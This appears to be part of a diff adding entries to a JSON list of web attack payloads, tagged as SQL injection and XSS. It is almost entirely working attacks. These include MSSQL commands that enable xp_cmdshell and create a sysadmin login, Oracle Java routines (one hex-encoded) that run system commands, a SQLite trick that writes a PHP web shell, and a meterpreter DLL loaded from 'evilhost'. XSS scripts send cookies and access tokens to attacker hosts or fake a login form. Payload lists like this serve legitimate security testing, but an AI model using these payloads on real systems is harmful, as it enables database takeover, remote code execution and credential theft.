+        "payload": "xp_dirtree '\\\\attackerip\\file'\nxp_fileexist '\\\\attackerip\\file'\nBACKUP LOG [TESTING] TO DISK = '\\\\attackerip\\file'\nBACKUP DATABASE [TESTING] TO DISK = '\\\\attackeri\\file'\nRESTORE LOG [TESTING] FROM DISK = '\\\\attackerip\\file'\nRESTORE DATABASE [TESTING] FROM DISK = '\\\\attackerip\\file'\nRESTORE HEADERONLY FROM DISK = '\\\\attackerip\\file'\nRESTORE FILELISTONLY FROM DISK = '\\\\attackerip\\file'\nRESTORE LABELONLY FROM DISK = '\\\\attackerip\\file'\nRESTORE REWINDONLY FROM DISK = '\\\\attackerip\\file'\nRESTORE VERIFYONLY FROM DISK = '\\\\attackerip\\file'",
+        "owaspCategory": "SQL Injection"
+    },
+    {
+        "id": 97,
+        "payload": "-- find link\nselect * from master..sysservers\n\n-- execute query through the link\nselect * from openquery(\"dcorp-sql1\", 'select * from master..sysservers')\nselect version from openquery(\"linkedserver\", 'select @@version as version');\n\n-- chain multiple openquery\nselect version from openquery(\"link1\",'select version from openquery(\"link2\",\"select @@version as version\")')\n\n-- execute shell commands\nEXECUTE('sp_configure ''xp_cmdshell'',1;reconfigure;') AT LinkedServer\nselect 1 from openquery(\"linkedserver\",'select 1;exec master..xp_cmdshell \"dir c:\"')\n\n-- create user and give admin privileges\nEXECUTE('EXECUTE(''CREATE LOGIN hacker WITH PASSWORD = ''''P@ssword123.'''' '') AT \"DOMINIO\\SERVER1\"') AT \"DOMINIO\\SERVER2\"\nEXECUTE('EXECUTE(''sp_addsrvrolemember ''''hacker'''' , ''''sysadmin'''' '') AT \"DOMINIO\\SERVER1\"') AT \"DOMINIO\\SERVER2\"",
+        "owaspCategory": "SQL Injection"
+    },
+    {
+        "id": 98,
+        "payload": "SELECT * FROM fn_my_permissions(NULL, 'SERVER');",
+        "owaspCategory": "SQL Injection"
+    },
+    {
+        "id": 99,
+        "payload": "SELECT * FROM fn_my_permissions (NULL, 'DATABASE');",
+        "owaspCategory": "SQL Injection"
+    },
+    {
+        "id": 100,
+        "payload": "SELECT * FROM fn_my_permissions('Sales.vIndividualCustomer', 'OBJECT') ORDER BY subentity_name, permission_name;",
+        "owaspCategory": "SQL Injection"
+    },
+    {
+        "id": 101,
+        "payload": "-- possible roles: sysadmin, serveradmin, dbcreator, setupadmin, bulkadmin, securityadmin, diskadmin, public, processadmin\n    SELECT is_srvrolemember('sysadmin');",
+        "owaspCategory": "SQL Injection"
+    },
+    {
+        "id": 102,
+        "payload": "EXEC master.dbo.sp_addsrvrolemember 'user', 'sysadmin;",
+        "owaspCategory": "SQL Injection"
+    },
+    {
+        "id": 103,
+        "payload": "SELECT name, password FROM master..sysxlogins\n    SELECT name, master.dbo.fn_varbintohexstr(password) FROM master..sysxlogins \n    -- Need to convert to hex to return hashes in MSSQL error message / some version of query analyzer",
+        "owaspCategory": "SQL Injection"
+    },
+    {
+        "id": 104,
+        "payload": "SELECT name, password_hash FROM master.sys.sql_logins\n    SELECT name + '-' + master.sys.fn_varbintohexstr(password_hash) from master.sys.sql_logins",
+        "owaspCategory": "SQL Injection"
+    },
+    {
+        "id": 105,
+        "payload": "-- 'sp_password' was found in the text of this event.\n-- The text has been replaced with this comment for security reasons.",
+        "owaspCategory": "SQL Injection"
+    },
+    {
+        "id": 106,
+        "payload": "SELECT DISTINCT owner FROM all_tables;\nSELECT OWNER FROM (SELECT DISTINCT(OWNER) FROM SYS.ALL_TABLES)",
+        "owaspCategory": "SQL Injection"
+    },
+    {
+        "id": 107,
+        "payload": "SELECT table_name FROM all_tables;\nSELECT owner, table_name FROM all_tables;\nSELECT owner, table_name FROM all_tab_columns WHERE column_name LIKE '%PASS%';\nSELECT OWNER,TABLE_NAME FROM SYS.ALL_TABLES WHERE OWNER='<DBNAME>'",
+        "owaspCategory": "SQL Injection"
+    },
+    {
+        "id": 108,
+        "payload": "SELECT column_name FROM all_tab_columns WHERE table_name = 'blah';\nSELECT COLUMN_NAME,DATA_TYPE FROM SYS.ALL_TAB_COLUMNS WHERE TABLE_NAME='<TABLE_NAME>' AND OWNER='<DBNAME>'",
+        "owaspCategory": "SQL Injection"
+    },
+    {
+        "id": 109,
+        "payload": "AND [RANDNUM]=DBMS_PIPE.RECEIVE_MESSAGE('[RANDSTR]',[SLEEPTIME]) \nAND 1337=(CASE WHEN (1=1) THEN DBMS_PIPE.RECEIVE_MESSAGE('RANDSTR',10) ELSE 1337 END)",
+        "owaspCategory": "SQL Injection"
+    },
+    {
+        "id": 110,
+        "payload": "SELECT EXTRACTVALUE(xmltype('<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM \"http://'||(SELECT YOUR-QUERY-HERE)||'.BURP-COLLABORATOR-SUBDOMAIN/\"> %remote;]>'),'/l') FROM dual",
+        "owaspCategory": "SQL Injection"
+    },
+    {
+        "id": 111,
+        "payload": "select * from dba_java_policy\n    select * from user_java_policy",
+        "owaspCategory": "SQL Injection"
+    },
+    {
+        "id": 112,
+        "payload": "exec dbms_java.grant_permission('SCOTT', 'SYS:java.io.FilePermission','<<ALL FILES>>','execute');\n    exec dbms_java.grant_permission('SCOTT','SYS:java.lang.RuntimePermission', 'writeFileDescriptor', '');\n    exec dbms_java.grant_permission('SCOTT','SYS:java.lang.RuntimePermission', 'readFileDescriptor', '');",
+        "owaspCategory": "SQL Injection"
+    },
+    {
+        "id": 113,
+        "payload": "SELECT DBMS_JAVA_TEST.FUNCALL('oracle/aurora/util/Wrapper','main','c:\\\\windows\\\\system32\\\\cmd.exe','/c', 'dir >c:\\test.txt') FROM DUAL\n        SELECT DBMS_JAVA_TEST.FUNCALL('oracle/aurora/util/Wrapper','main','/bin/bash','-c','/bin/ls>/tmp/OUT2.LST') from dual",
+        "owaspCategory": "SQL Injection"
+    },
+    {
+        "id": 114,
+        "payload": "SELECT DBMS_JAVA.RUNJAVA('oracle/aurora/util/Wrapper /bin/bash -c /bin/ls>/tmp/OUT.LST') FROM DUAL",
+        "owaspCategory": "SQL Injection"
+    },
+    {
+        "id": 115,
+        "payload": "BEGIN\n    EXECUTE IMMEDIATE 'create or replace and compile java source named \"PwnUtil\" as import java.io.*; public class PwnUtil{ public static String runCmd(String args){ try{ BufferedReader myReader = new BufferedReader(new InputStreamReader(Runtime.getRuntime().exec(args).getInputStream()));String stemp, str = \"\";while ((stemp = myReader.readLine()) != null) str += stemp + \"\\n\";myReader.close();return str;} catch (Exception e){ return e.toString();}} public static String readFile(String filename){ try{ BufferedReader myReader = new BufferedReader(new FileReader(filename));String stemp, str = \"\";while((stemp = myReader.readLine()) != null) str += stemp + \"\\n\";myReader.close();return str;} catch (Exception e){ return e.toString();}}};';\n    END;\n\n    BEGIN\n    EXECUTE IMMEDIATE 'create or replace function PwnUtilFunc(p_cmd in varchar2) return varchar2 as language java name ''PwnUtil.runCmd(java.lang.String) return String'';';\n    END;\n\n    -- hex encoded payload\n    SELECT TO_CHAR(dbms_xmlquery.getxml('declare PRAGMA AUTONOMOUS_TRANSACTION; begin execute immediate utl_raw.cast_to_varchar2(hextoraw(''637265617465206f72207265706c61636520616e6420636f6d70696c65206a61766120736f75726365206e616d6564202270776e7574696c2220617320696d706f7274206a6176612e696f2e2a3b7075626c696320636c6173732070776e7574696c7b7075626c69632073746174696320537472696e672072756e28537472696e672061726773297b7472797b4275666665726564526561646572206d726561643d6e6577204275666665726564526561646572286e657720496e70757453747265616d5265616465722852756e74696d652e67657452756e74696d6528292e657865632861726773292e676574496e70757453747265616d282929293b20537472696e67207374656d702c207374723d22223b207768696c6528287374656d703d6d726561642e726561644c696e6528292920213d6e756c6c29207374722b3d7374656d702b225c6e223b206d726561642e636c6f736528293b2072657475726e207374723b7d636174636828457863657074696f6e2065297b72657475726e20652e746f537472696e6728293b7d7d7d''));\n    EXECUTE IMMEDIATE utl_raw.cast_to_varchar2(hextoraw(''637265617465206f72207265706c6163652066756e6374696f6e2050776e5574696c46756e6328705f636d6420696e207661726368617232292072657475726e207661726368617232206173206c616e6775616765206a617661206e616d65202770776e7574696c2e72756e286a6176612e6c616e672e537472696e67292072657475726e20537472696e67273b'')); end;')) results FROM dual",
+        "owaspCategory": "SQL Injection"
+    },
+    {
+        "id": 116,
+        "payload": "SELECT PwnUtilFunc('ping -c 4 localhost') FROM dual;",
+        "owaspCategory": "SQL Injection"
+    },
+    {
+        "id": 117,
+        "payload": "SELECT os_command.exec_clob('<COMMAND>') cmd from dual",
+        "owaspCategory": "SQL Injection"
+    },
+    {
+        "id": 118,
+        "payload": "DBMS_SCHEDULER.CREATE_JOB (job_name => 'exec', job_type => 'EXECUTABLE', job_action => '<COMMAND>', enabled => TRUE)",
+        "owaspCategory": "SQL Injection"
+    },
+    {
+        "id": 119,
+        "payload": "utl_file.get_line(utl_file.fopen('/path/to/','file','R'), <buffer>)",
+        "owaspCategory": "SQL Injection"
+    },
+    {
+        "id": 120,
+        "payload": "utl_file.put_line(utl_file.fopen('/path/to/','file','R'), <buffer>)",
+        "owaspCategory": "SQL Injection"
+    },
+    {
+        "id": 121,
+        "payload": "AND CASE WHEN [BOOLEAN_QUERY] THEN 1 ELSE load_extension(1) END",
+        "owaspCategory": "SQL Injection"
+    },
+    {
+        "id": 122,
+        "payload": "AND [RANDNUM]=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB([SLEEPTIME]00000000/2))))\nAND 1337=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(1000000000/2))))",
+        "owaspCategory": "SQL Injection"
+    },
+    {
+        "id": 123,
+        "payload": "ATTACH DATABASE '/var/www/lol.php' AS lol;\nCREATE TABLE lol.pwn (dataz text);\nINSERT INTO lol.pwn (dataz) VALUES (\"<?php system($_GET['cmd']); ?>\");--",
+        "owaspCategory": "SQL Injection"
+    },
+    {
+        "id": 124,
+        "payload": "UNION SELECT 1,load_extension('\\\\evilhost\\evilshare\\meterpreter.dll','DllMain');--",
+        "owaspCategory": "SQL Injection"
+    },
+    {
+        "id": 125,
+        "payload": "SELECT writefile('/path/to/file', column_name) FROM table_name",
+        "owaspCategory": "SQL Injection"
+    },
+    {
+        "id": 126,
+        "payload": "<script>document.location='http://localhost/XSS/grabber.php?c='+document.cookie</script>\n<script>document.location='http://localhost/XSS/grabber.php?c='+localStorage.getItem('access_token')</script>\n<script>new Image().src=\"http://localhost/cookie.php?c=\"+document.cookie;</script>\n<script>new Image().src=\"http://localhost/cookie.php?c=\"+localStorage.getItem('access_token');</script>",
+        "owaspCategory": "XSS Injection"
+    },
+    {
+        "id": 127,
+        "payload": "<script>\n  fetch('https://<SESSION>.burpcollaborator.net', {\n  method: 'POST',\n  mode: 'no-cors',\n  body: document.cookie\n  });\n</script>",
+        "owaspCategory": "XSS Injection"
+    },
+    {
+        "id": 128,
+        "payload": "<script>\nhistory.replaceState(null, null, '../../../login');\ndocument.body.innerHTML = \"</br></br></br></br></br><h1>Please login to continue</h1><form>Username: <input type='text'>Password: <input type='password'></form><input value='submit' type='submit'>\"\n</script>",
+        "owaspCategory": "XSS Injection"
+    },
+    {
+        "id": 129,
+        "payload": "<script>alert(document.domain.concat(\"\\n\").concat(window.origin))</script>",
+        "owaspCategory": "XSS Injection"
+    },
+    {
+        "id": 130,
+        "payload": "<script>console.log(\"Test XSS from the search bar of page XYZ\\n\".concat(document.domain).concat(\"\\n\").concat(window.origin))</script>",
+        "owaspCategory": "XSS Injection"
+    },
+    {
+        "id": 131,
+        "payload": "<svg/onload='fetch(\"//host/a\").then(r=>r.text().then(t=>eval(t)))'>\n<script src=14.rs>\n// you can also specify an arbitrary payload with 14.rs/#payload\ne.g: 14.rs/#alert(document.domain)",
+        "owaspCategory": "XSS Injection"
+    },
+    {
+        "id": 132,
+        "payload": "<!DOCTYPE html>\n<html>\n<head>\n<style>\ndiv  {\n    background-image: url(\"data:image/jpg;base64,<\\/style><svg/onload=alert(document.domain)>\");\n    background-color: #cccccc;\n}\n</style>\n</head>\n  <body>\n    <div>lol</div>\n  </body>\n</html>",
+        "owaspCategory": "XSS Injection"
+    },
+    {
+        "id": 133,
+        "payload": "<html>\n<body>\n    <input type=button value=\"Click Me\" id=\"btn\">\n</body>\n\n<script>\ndocument.getElementById('btn').onclick = function(e){\n    window.poc = window.open('http://www.redacted.com/#login');\n    setTimeout(function(){\n        window.poc.postMessage(\n            {\n                \"sender\": \"accounts\",\n                \"url\": \"javascript:confirm('XSS')\",\n            },\n            '*'\n        );\n    }, 2000);\n}\n</script>\n</html>",
+        "owaspCategory": "XSS Injection"
+    },
+    {
+        "id": 134,
+        "payload": "<script>document.location='http://10.10.14.30:8080/XSS/grabber.php?c='+document.domain</script>",
+        "owaspCategory": "XSS Injection"
+    }
+]
